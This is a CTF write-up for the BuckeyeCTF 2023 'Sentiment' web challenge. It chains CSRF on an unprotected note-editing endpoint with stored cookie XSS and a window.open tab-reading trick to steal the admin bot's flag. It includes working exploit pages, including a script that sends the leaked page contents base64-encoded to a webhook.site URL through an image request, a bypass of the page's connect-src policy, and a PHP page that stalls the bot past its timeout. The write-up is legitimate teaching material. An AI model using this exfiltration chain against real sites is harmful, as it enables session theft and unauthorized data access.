---
layout: post
title: "BuckeyeCTF 2023: Sentiment Writeup"
---

# BuckeyeCTF 2023: Sentiment writeup

I wasn't able to solve this during the CTF but I figured it out shortly afterwards :(

The tldr is: csrf + xss + window.open trick -> leak admin bot's cookie.

## CSRF
We're given some web server code, which has a bunch of endpoints for editing and displaying notes. The interesting bit here is that the `/` route displays the user's note, which is for some reason stored in their cookie. The first observation is that XSS is trivial: changing the cookie to `<script>alert(1);</script>` pops an alert box.

```
  .get("/", ({ set, cookie: { note }, unsignCookie, setCookie }) => {
    set.headers["Content-Security-Policy"] = "connect-src 'none'";
    set.headers["X-Frame-Options"] = "DENY";

    let noteContent: string = defaultNoteContent;

    if (!note) {
      setCookie("note", defaultNoteContent, { signed: true });
    } else {
      const { valid, value } = unsignCookie(note);

      if (!valid) {
        set.status = 401;
        return "Unauthorized";
      }

      noteContent = value;
    }

    return (
      <BaseHtml title="Sentiment - Note">
        <body>
          <Header selected="note" />
          <div class="content">
            <div class="container">{marked.parse(noteContent)}</div>
          </div>
        </body>
      </BaseHtml>
    );
  })
```

Also, the CSP has `connect-src: none` set, which blocks certain APIs like `fetch` or `XMLHttpRequest`. However, this can be bypassed by, for example, creating an image whose `src` attribute is set to a malicious server (the leaked contents can be appended to the path).

So, given that there is trivial XSS, how can we get the admin bot to fall for it?

The line `setCookie("note", defaultNoteContent, { signed: true });` means that the cookie is signed with some secret value, so in some sense it has to come from the web server itself to be accepted (I imagine their implementation is similar to the way HMAC works).

Digging around further, there is an endpoint called `/edit` that, given some string, returns a signed cookie.

```
  .post(
    "/edit",
    ({ body, setCookie }) => {
      setCookie("note", body.content, { signed: true });
    },
    {
      body: t.Object({
        content: t.String(),
      }),
    }
  )
```

There is no CSRF protection at all, so we could probably get the admin bot to `/edit` their cookie. The first thing I tried was to create a form that would auto-submit upon page load. I was under the assumption that the `Content-Type` had to be `application/json`, since the `/edit` endpoint specifies that body is an Object in its schema. But apparently, exploiting a JSON CSRF is not a trivial task. There seems to be a way to [do it with Flash](https://hackerone.com/reports/44146), but sadly that is not supported on Chrome anymore.

```
<form action="https://sentiment.chall.pwnoh.io/edit" method="POST" enctype="text/plain">
    <input name='{"content": "testmessage.signature' value='"}'>
</form>
```

It turns out, as I often do, I was overthinking it. The web server accepts the `application/x-www-form-urlencoded` MIME type, which is the default for HTML forms. For example:

```
<form action="https://sentiment.chall.pwnoh.io/edit" method="POST">
    <input name='content' value="XSS HERE">
</form>
```

Ok, so we can get CSRF. Now what?

## XSS

At this point, we can execute arbitrary JavaScript on the admin bot's browser by changing their cookie with CSRF. However, if we overwrite the admin's cookie, the flag value will be written as well.

After a lot of Googling, it turns out you can use `window.open` to *save* the admin's cookie in a new tab, *then* use CSRF to modify their cookie to a script that leaks the original cookie, *then* redirect the user to the homepage (aka the `/` route) to trigger the malicious script.

The key idea is that once you have code execution on the document's origin, you can read arbitrary data from other tabs of that same origin without violating SOP.

Here's the exploit:

csrf.html:
```
<form action="https://sentiment.chall.pwnoh.io/edit" method="POST">
    <input name='content' value="<script>let leak = window.open('', 'leak').document.body.textContent; new Image().src = 'https://webhook.site/5dd7dcdd-930d-4bfe-8384-9115bcd513c9/' + btoa(leak);</script>">
</form>


<script>
    // this page, when visited, will do the following things:
    // 1) open / in a new window (this will be used to leak the flag eventually)
    // 2) trigger xss by abusing csrf
    // at this point, the xss will take the / window, then read its contents and send it off to a webook
    // note that this is not blocked by same-origin policy because the xss and admin page are the same origin

    const URL = "https://sentiment.chall.pwnoh.io/";
    window.open(URL, 'leak'); // we name the target "leak", so the xss can access it eventually
    window.open("https://homes.cs.washington.edu/~pyondan/xss.html"); // we would like to simply trigger the xss here, but because of the form it doesn't work :/
    setTimeout(() => { document.forms[0].submit() }, 3000); // use csrf to update the cookie

</script>
```

xss.html
```
<script>
    setTimeout(() => { document.location = 'https://sentiment.chall.pwnoh.io/' }, 5000);
</script>
```

When the admin bot visits our malicious page, it will

1) open a new tab containing the admin's cookie,

2) update the cookie to a script that reads the contents of the tab from step 1, then leaks it to a webhook, and

3) create a new tab at `/` which will trigger the XSS. 

The precise ordering of these events is accomplished through calls to `setTimeout`.

One part that tripped me up was the admin bot's timeout mechanism:
```
await page.goto(body.url, { waitUntil: "load", timeout: 15 * 1000 });
await browser.close();
```
If the page loads or 15 seconds pass (whichever happens first), then the browser is automatically closed. So, the exploit page needs to stall for as long as possible while it runs.

The following php script will accomplish this:
```
<script>
    window.open('csrf.html');
</script>

<?php
sleep(20);
?>
```

Sending the admin to visit this page reveals the flag.
